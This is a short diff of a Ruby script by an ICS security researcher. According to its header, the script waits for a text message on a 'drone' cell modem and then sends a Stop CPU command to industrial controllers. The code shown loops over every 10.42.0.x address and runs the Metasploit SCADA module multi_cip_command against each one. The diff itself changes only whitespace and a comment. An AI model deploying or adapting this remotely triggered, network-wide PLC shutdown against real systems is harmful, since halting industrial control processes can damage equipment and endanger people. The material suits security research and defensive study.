@@ -1,12 +1,12 @@
 ##########################################################
 #
 #	Author: Stephen J. Hilt
-#			hilt@digitalbond.com
+#		hilt@digitalbond.com
 #
 #
 #	This Will listen on the drone cell for a Text Message
 #	Once specified Message is received, it will then send
-#   Stop CPU command on the given network. 
+#   	Stop CPU command on the given network. 
 #
 #
 #########################################################
@@ -43,7 +43,7 @@ def recv_txt(sp)
 				while (count < 255) do
 					# Setup IP Address
 					ipaddr = '10.42.0.' + count 
-					# run metasploit module for each command
+					# run metasploit module for each address
 					ret_val = system( "msfcli auxiliary/admin/scada/multi_cip_command RHOST=" + ipaddr + " E" )
 					# Increment Counter
 					count = count + 1
